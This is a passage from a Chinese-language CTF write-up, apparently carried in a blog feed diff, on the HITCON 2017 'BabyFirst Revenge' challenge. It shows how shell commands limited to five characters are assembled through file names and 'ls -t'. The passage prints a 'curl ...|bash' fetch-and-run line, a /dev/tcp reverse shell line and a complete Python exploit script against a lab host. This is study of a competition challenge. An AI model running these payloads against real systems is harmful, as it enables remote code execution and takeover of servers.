-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'reset'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/rm -rf '&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sandbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;无论我们传什么进去他都会照单执行，但是每次的长度限制为最多5个字符，正常来说最短(?)的写shell方式应该是&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;x&amp;gt;&amp;gt;1
-....
-sh 1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;但是其实我们可以利用ls来写shell，如下：&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;a
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;_
-sh _  &lt;span class=&quot;c&quot;&gt;#也就执行了a指令 但是没有意义，所以我们就要构造一系列的指令出来追加到文件里&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;那么这里就涉及到几个问题：&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;ls出来是按照什么顺序排列的文件？&lt;/li&gt;
-  &lt;li&gt;追加文件的时候会自动加入换行 这个问题要怎么解决？&lt;/li&gt;
-  &lt;li&gt;如果ls途中有无用的文件怎么办？ 因为如果是以上的做法的话其实&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat _&lt;/code&gt;你会发现里面还有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt;文件&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;答案：&lt;/p&gt;
-  &lt;ol&gt;
-    &lt;li&gt;ls -l的默认排序方式手册上写了是alphabetically（字典序）也就是说有可能后面加入的文件名排在前面，为了避免这个问题我们可以加入-t参数来使ls之后的结果按照最近修改的文件在前面的方式排列&lt;/li&gt;
-    &lt;li&gt;linux的命令执行中支持命令换行 需要用到反斜杠\ 写到最后面，如：&lt;img src=&quot;/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-复现/1.png&quot; alt=&quot;🌰&quot; /&gt;&lt;/li&gt;
-    &lt;li&gt;其实bash在执行脚本的时候遇到未知的命令会报错 但是这并不会使之退出，bash会继续执行下一行的命令，如图&lt;img src=&quot;/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-复现/2.png&quot; alt=&quot;🌰&quot; /&gt;&lt;/li&gt;
-  &lt;/ol&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;那到这里思路其实已经挺清晰的了, 就是通过写入一系列指令的分段，并用反斜杠\作为文件结尾，最后执行ls -t&amp;gt;g并且sh g来执行我们想要的指令，这里以执行反弹shell为例：&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl 10.188.2.20|bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;我的10.188.2.20/index.html文件内容为:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.188.2.20/12345 0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;写入 ls -t&amp;gt;g指令到_文件&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?cmd&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;#创建ls\&lt;/span&gt;
-?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;_    &lt;span class=&quot;c&quot;&gt;#创建 _ 文件 文件内容为_ \n ls\ \n&lt;/span&gt;
-?cmd&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ \\&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;#创建 \空格 文件&lt;/span&gt;
-?cmd&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;#创建 -t\ 文件&lt;/span&gt;
-?cmd&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;g    &lt;span class=&quot;c&quot;&gt;#创建 &amp;gt;g 文件&lt;/span&gt;
-?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;_   &lt;span class=&quot;c&quot;&gt;#将刚刚创建的文件名按照字典序写入_文件 这里的字典序是特殊符号在ls\的前面 所以在生成ls\之后我们要先ls&amp;gt;_ 保证ls\在最前面&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;最后生成的_文件结果如图：
-&lt;img src=&quot;/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-复现/3.png&quot; alt=&quot;_ 文件&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;最后我们需要生成我们自己的命令的时候直接sh _就可以在g文件里面生成我们想要的命令了 然后再sh g就可以rce了&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;比如我要执行 curl 10.188.2.20&lt;/td&gt;
-      &lt;td&gt;bash (index.html已经提前放好反弹shell的命令)&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;因为这是按照时间倒叙ls 所以我要倒着生成我要执行的指令文件，比如orange大大的exp：&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# generate `ls -t&amp;gt;g` file
-&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;'&amp;gt;ls&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'ls&amp;gt;_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;\ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;-t&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;\&amp;gt;g'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'ls&amp;gt;&amp;gt;_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-
-    &lt;span class=&quot;c1&quot;&gt;# generate `curl orange.tw.tw|python`
-&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# generate `curl 10.188.2.20|bash` 
-&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;'&amp;gt;sh\ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;\|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;2.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;8.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;18&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;0.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;\ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;rl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'&amp;gt;cu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-
-    &lt;span class=&quot;c1&quot;&gt;# exec
-&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;'sh _'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;'sh g'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-
-
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://10.188.2.20:22460/?reset=1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://10.188.2.20:22460/?cmd='&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;在生成自己的命令时要注意各个命令段之间名字不能相同 因为不能生成两个带有相同命令段的文件名&lt;/p&gt;
-
-&lt;p&gt;//偷懒偷了好久才复现的。。Orz。。。。批评一下自己的懒惰。。
-各位大佬有啥更好的思路欢迎分享&lt;/p&gt;
-
-&lt;p&gt;参考:
-https://github.com/orangetw/My-CTF-Web-Challenges&lt;/p&gt;
-</description>
-        <pubDate>Mon, 27 Nov 2017 01:39:00 +0800</pubDate>
-        <link>https://blog.pr0ph3t.com//posts/hitcon2017-BabyFirst-Revenge%E5%A4%8D%E7%8E%B0/</link>
-        <guid isPermaLink="true">https://blog.pr0ph3t.com//posts/hitcon2017-BabyFirst-Revenge%E5%A4%8D%E7%8E%B0/</guid>
         
         <category>CyberSecurity</category>
         
